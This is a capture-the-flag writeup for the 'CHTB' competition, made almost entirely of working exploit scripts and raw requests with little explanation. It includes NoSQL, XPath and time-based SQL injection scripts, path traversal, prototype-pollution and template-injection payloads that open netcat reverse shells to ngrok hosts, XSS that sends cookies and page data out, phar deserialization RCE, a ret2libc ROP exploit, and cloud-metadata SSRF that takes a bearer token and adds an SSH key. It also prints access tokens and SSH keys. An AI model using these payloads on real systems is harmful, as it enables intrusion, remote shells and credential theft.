# CHTB Writeup

## caas
```
POST /api/curl HTTP/1.1
Host: 139.59.167.242:31070
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

ip=-F password=@../../flag tfc5mi0mx9ixubbdbv6z07a37udo1d.burpcollaborator.net
```

## MiniSTRyplace
```
http://178.62.77.109:31006/?lang=..././..././..././/flag
```

## Wild Goose Hunt
```python
import requests
import string

flag = "CHTB{"
url = "http://138.68.141.182:32172/api/login"

restart = True

while restart:
    restart = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data)

        if b"Login Successful" in r.content:
            print(payload)
            restart = True
            flag = payload
            if i == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
```
## BlitzPop
```python
import requests

TARGET_URL = 'http://46.101.53.249:30402'

# make pollution
r = requests.post(TARGET_URL + '/api/submit', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "console.log(process.mainModule.require('child_process').execSync(`rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 6.tcp.ngrok.io 18748 >/tmp/f`))",
    },
    "song.name": "Not Polluting with the boys"
})
print(r.content)
```
## Etree
```python
import requests
import string
import json

flag1 = "CHTB{"
flag = ""
url = "http://139.59.165.102:30339/api/search"

restart = True
while restart:
    restart = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag1 + i
        c = len(payload)
        header = {"Content-Type": "application/json"}
        post_data = {"search": "' or substring(/military/district/staff/selfDestructCode[position()=1],1,{})='".format(c) + payload + "' and ''='"}
        r = requests.post(url, data=json.dumps(post_data),headers=header)
        if b"success" in r.content:
            print(payload)
            restart = True
            flag1 = payload
            break
print("Finding Flag 2")
restart = True
while restart:
    restart = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        c = len(payload)
        header = {"Content-Type": "application/json"}
        post_data = {"search": "' or substring(/military/district[position()=3]/staff/selfDestructCode[position()=1],1,{})='".format(c) + payload + "' and ''='"}
        r = requests.post(url, data=json.dumps(post_data),headers=header)
        if b"success" in r.content:
            print(payload)
            restart = True
            flag = payload
            if i == "}":
                print("\nFlag: " + flag1+flag)
                exit(0)
            break
```

## Extortion
```
http://178.62.14.240:31972/?f=../../../../../tmp/sess_0dfe17dd3e06d15e535d5467722402d2  // enter ur php session id after sess_
output:
files
flag_ffacf623917dc0e2f83e9041644b3e98.txt
index.php
send.php

http://178.62.14.240:31972/?f=../../../../../var/www/html/flag_ffacf623917dc0e2f83e9041644b3e98.txt```
```
## Galatic Time
```html
//Galactic Times
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.8/angular.js"> </script>
<K Ng-App>{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`var _=new XMLHttpRequest();
    _.onreadystatechange = function()
    { if (this.readyState == 4 && this.status == 200) {
        var abc = this.responseText;
        document.body.innerHTML += abc;
        var a = document.getElementsByClassName("edition")[1]
        location.href = "http://f89df8511c55.ngrok.io/" + a.innerHTML;
    }
    }
    _.open("GET","/alien");
    _.send();`),a')
}}
```
## Cessation
```
url//shutdown
```

## Emoji Voting
```python
import requests
import string
import json
import time

url = "http://139.59.190.72:31261/api/list"

restart = True
payload2 = "count AND 8268=(CASE WHEN (SUBSTR((SELECT COALESCE(flag,' ') FROM flag_47967af98d LIMIT 0,1),1,1)='C') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 8268 END)"
noo = 6
tablename = ""
while restart:
    restart = False
    for i in string.digits + string.ascii_letters + "!@#$%^()@_{}":        
        #for table name uncomment the payload below
        #payload = "count AND 8263=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 0,1),"+str(noo)+",1)='"+i+"') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 8263 END)"
        #the payload below is for flag ( need to change FROM flag_5106b13ae7 to the table name from running above payload)
        payload = "count AND 8268=(CASE WHEN (SUBSTR((SELECT COALESCE(flag,' ') FROM flag_5106b13ae7 LIMIT 0,1),"+str(noo)+",1)='"+i+"') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 8268 END)"
        print(payload)
        header = {"Content-Type": "application/json"}
        post_data = { 'order' : payload }
        try:
            r = requests.post(url, data=json.dumps(post_data),headers=header)
        except Exception as e:
            print(e)
            time.sleep(90)
            tablename += i
            #print("flag_"+tablename)
            print("CHTB{"+tablename)
            noo += 1
            restart = True
            if i == "}":
                print("\nFlag: " + "CHTB{"+tablename)
                exit(0)
            break
```     
## alien complaint form
```html
CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}

<iframe src="/list?callback=var xhttp = new XMLHttpRequest();
xhttp.open('POST', '/api/submit', true);
const json = {'complaint':'asdf'};
xhttp.setRequestHeader('Content-type', 'application/json');
xhttp.send(JSON.stringify(json));"></iframe>
```

## Starfleet
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('nc -e /bin/sh 2.tcp.ngrok.io 10478')")()}}
CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
```
## Bug Report
```
POST /api/submit HTTP/1.1
Host: 138.68.177.159:32111
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.177.159:32111/
Content-Type: application/json
Origin: http://138.68.177.159:32111
Content-Length: 283
Connection: close

{"url":"http://127.0.0.1:1337/<script>var xhttp = new XMLHttpRequest();xhttp.open('POST', '/api/submit', true);const json = {'url':'http://a574f907860a.ngrok.io/'+document.cookie};xhttp.setRequestHeader('Content-type', 'application/json');xhttp.send(JSON.stringify(json));</script>"}
```
## Daas
```
mgthura@mgthura404:~$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system 'cat ../../../flagwoqCj'
mgthura@mgthura404:~$ python3 laravel-ignition-rce.py http://178.62.14.240:30005/ /tmp/exploit.phar
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
--------------------------
+ Logs cleared
```
## gcloud pwn
```
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
take instance zones projectid

{"instance":{"attributes":{"ssh-keys":"lol:ssh-ed25519AAAAC3NzaC1lZDI1NTE5AAAAIDxFW5GqiU4GPyD0S1kLuIJVPwXk/eADjVQzUGaMozmq lol"},"description":"","disks":[{"deviceName":"instance-1","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT-BALANCED"}],"guestAttributes":{},"hostname":"instance-1.c.essential-hawk-310212.internal","id":7397947137517811906,"image":"projects/debian-cloud/global/images/debian-10-buster-v20210316","licenses":[{"id":"5543610867827062957"}],"machineType":"projects/911957843158/machineTypes/e2-medium","maintenanceEvent":"NONE","name":"instance-1","networkInterfaces":[{"accessConfigs":[{"externalIp":"162.222.183.14","type":"ONE_TO_ONE_NAT"}],"dnsServers":["169.254.169.254"],"forwardedIps":[],"gateway":"10.128.0.1","ip":"10.128.0.2","ipAliases":[],"mac":"42:01:0a:80:00:02","mtu":1460,"network":"projects/911957843158/networks/default","subnetmask":"255.255.240.0","targetInstanceIps":[]}],"preempted":"FALSE","scheduling":{"automaticRestart":"TRUE","onHostMaintenance":"MIGRATE","preemptible":"FALSE"},"serviceAccounts":{"default":{"aliases":["default"],"email":"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]},"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com":{"aliases":["default"],"email":"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]}},"tags":[],"zone":"projects/911957843158/zones/us-central1-a"},"oslogin":{"authenticate":{"sessions":{}}},"project":{"attributes":{"ssh-keys":"jr:ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAEUOV4KIMTPjZyJ/B1bcSWqtWD5d0MspK8jobiSbrhZWoDIeuDCahSju6IjYzgX8ZJQjXP1iXZkMUsWcwMHzPYVbfpAv9qLeuZOF6vUrkiiFXPCCmJCqFH8BewWjYIlJfIBcWEIT/0C+HOQM1aMkdDkHrW2gLPvMUJOswHXMz/q0x2W9MKxtobXhl89qKD2jZGaLEOCpz3zFogRY8nG++Td3KqzX6X0tZx6ucUcon0iw4UiBoSDrnmqWjnR147fGtrmMGT73tAgiTprv/WMoS3SmIMQA5E0n9ef6iJHgZfhcIsFVl1Rf6aOml5dja6B8T3n0skKMhopufRSyob480dc= google-ssh{\"userName\":\"makelarisjr@hackthebox.eu\",\"expireOn\":\"2021-04-23T14:46:00+0000\"}\njr:ecdsa-sha2-nistp256AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFAPOmcooqFq9CzP2sz4MnDb54Mnj/JSnSvV8BDvXB+k4c9B6b1zVN6gqJLxKTKY4oPP1BAfhtpl1X5qeQH0+I= google-ssh{\"userName\":\"makelarisjr@hackthebox.eu\",\"expireOn\":\"2021-04-23T14:45:59+0000\"}\nunknown1:ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQDRnJrXGPgJi3sAmmtOIL1yiorFOQ4U9CIsI0OWds7izDtsPWXvinIQOpqxxWRXwdKc0Ye3vCN1L9imjmQ0ILN0UEQsCmZfxrlYBFsS8VpJbIwkewFSRTMirZ4IFN84twVWRHJiFZ0RGzIDlW8q/XA16iUygiS+ehGl/SyA9DwZwWZfLDRLkvj8O+widR6qlTu9juANWxO8klwsk06qilQ/k2y1dCzAI0LNGybmLHonaqJY35E80xSzZHPFDQIDSM1gYtGkcuiVGCE3VufdVhZHqGSI1L4MlPmjEnRlRGhINsoWl6eI0Ltw+QUdTh+zrQJvPhFg3NDbTILmRdL/m2LpxxQ9vG7pZmB41uRmkm+4UZgLPZiQGSWVaosbYADWXB6DXTBpMW5jatwtUtI3oiM6SdfC4DIdU/tlQ/L30MMhuds/V7om/izbxYGh2oKFgnVYGr5d5c3cMHTNfr8kjdn+TDQnEyRlBxUIOMd5pff4pzfyP4Pxorz03ZoEUruI4J8= unknown1@Macbook-makelaris.local\n"},"numericProjectId":911957843158,"projectId":"essential-hawk-310212"}}

http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json

bearer key 

{"access_token":"ya29.c.Ko8B-wdFVPTFS7HiybQl0ZpmG1AcayeOeBR-P1AkKgDk80RyDZM3oTJAAqZPG-2lJChN5MBuPpKj4Y1ZYBdKdrUgGMJVt9BR2fen6UGo9ilBUAtWB73D4N_nr-IU6vPjsxf5_6piJ9pf-T2iOiagUcEaUuYMcY1Tu_h7CpMHeA2fULXT8GicsvwKjU0uJroLFk0","expires_in":2842,"token_type":"Bearer"}

GET /compute/v1/projects/911957843158/zones/us-central1-a/instances/instance-1/ HTTP/1.1
Host: www.googleapis.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 0
Metadata-Flavor: Google
Authorization: Bearer ya29.c.Ko8B-wdFVPTFS7HiybQl0ZpmG1AcayeOeBR-P1AkKgDk80RyDZM3oTJAAqZPG-2lJChN5MBuPpKj4Y1ZYBdKdrUgGMJVt9BR2fen6UGo9ilBUAtWB73D4N_nr-IU6vPjsxf5_6piJ9pf-T2iOiagUcEaUuYMcY1Tu_h7CpMHeA2fULXT8GicsvwKjU0uJroLFk0


got fingerprint
change fingerprint and push my public key
curl -X POST "https://www.googleapis.com/compute/v1/projects/911957843158/zones/us-central1-a/instances/instance-1/setMetadata" -H "Auth orization: Bearer ya29.c.Ko8B-wdFVPTFS7HiybQl0ZpmG1AcayeOeBR-P1AkKgDk80RyDZM3oTJAAqZPG-2lJChN5MBuPpKj4Y1ZYBdKdrUgGMJVt9BR2fen6UGo9ilBUAtWB73D4N_nr-IU6vPjsxf5_6piJ9pf-T2iOiagUcEaUuYMcY1Tu_h7CpMHeA2fULXT8GicsvwKjU0uJroLFk0" -H "Content-Type: application/json"  --data '{ "fingerprint":"JFuLxKGnKlY=", "items": [ { "key ": "sshKeys","value": "makelarisjr:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0YB/R+mp4nQSnwm+t/3yDcC8pXNX4Z7toPylkPh0Tmw6f5KCS7DmM3CN/5cvlK2FDpl2AUMDyHTrbKSIXtYL zXIKOPEv1K8xerFJJ46vwhYT3zx3HQAI4MoDkY0ejG93YQBWhGPtlSkBepIyg+JOGiuyNsX90Izsxb1y1cRChO3ioiayUOQmTZP//Ygo/1FdLRZi145C0v2Np0ZS83y9zq+jQ0qQFkeCn+LYH76BwGExbW6dKt uI7Sld1WlCURpMdHFuyQPx6MjgzpW2nha0poUvzUVcKOlKD5fQzfFtSrvwExMLWP6WFzIZPR/DGQTG7SiWwGqlO2K01cmI++ppD makelarisjr"}]}'
ssh makelarisjr@ip
sudo su
cd /root/ 
```
## Controller
```python
from pwn import *
from Crypto.Util.number import *

libc = ELF("libc.so.6")
p = remote('159.65.20.140',31544)
#p = process('/home/kali/Desktop/controller')

base = "A"*32 + "B"*8
poprdi = 0x00000000004011d3
libc_start = 0x601ff0
puts = 0x400630
main = 0x401124
ret = 0x0000000000400606
p.recvuntil('recources: ')
p.sendline('-6 33')
p.recvuntil('> ')
p.sendline('3')
p.recvuntil('> ')
rop = base + p64(poprdi) + p64(libc_start) + p64(puts) + p64(main)
p.sendline(rop)
p.recvline()
libc_start_main = bytes_to_long(p.recvline()[-2::-1])
log.info("Address of leak libc = " + hex(libc_start_main))
libc.address = libc_start_main - libc.sym["__libc_start_main"]
log.info("Address of libc = " + hex(libc.address))

rop = base + p64(poprdi) + p64(next(libc.search("/bin/sh"))) + p64(ret) + p64(libc.sym["system"])
p.recvuntil('recources: ')
p.sendline('-6 33')
p.recvuntil('> ')
p.sendline('3')
p.recvuntil('> ')
p.sendline(rop)
p.interactive()
```
## Alien Camp
```python
from pwn import *
import re
import string
import binascii
import math
import sympy

context.log_level = "debug"

p=remote("138.68.152.10",32397)
p.recvuntil('> ')
p.sendline("1")
a = p.recvuntil('t!\n> ')
p.sendline("2")
res = [int(i) for i in a.split() if i.isdigit()]
print(res)
a = a.decode('utf-8')
for xloe in range(0,500):
    b = p.recvuntil("r: ")
    c = b.splitlines()
    calc = c[5]
    calc = calc.decode('utf-8')
    print(calc)
    calc = calc.replace("  = ?","")
    print(calc)
    list2 = ["🌞","🍨","❌","🍪","🔥","⛔","🍧","👺","👾","🦄"]
    list = {"🌞":res[0],"🍨":res[1],"❌":res[2],"🍪":res[3],"🔥":res[4],"⛔":res[5],"🍧":res[6],"👺":res[7],"👾":res[8],"🦄":res[9]}
    for i in range(0,10):
        if list2[i] in calc:
            #print(list2[i])
            #print(list["🌞"])
            bb = list2[i]
            cc = str(list[bb])
            calc = calc.replace(list2[i],cc)
    pload = str(eval(calc))
    p.sendline(pload)
p.recvall()
```
## Input as Service
```
ncat 46.101.22.121 31269
2.7.18 (default, Apr 20 2020, 19:51:05)
[GCC 9.2.0]
Do you sound like an alien?
>>>
__import__('os').system("cat flag.txt")
CHTB{4li3n5_us3_pyth0n2.X?!}
```
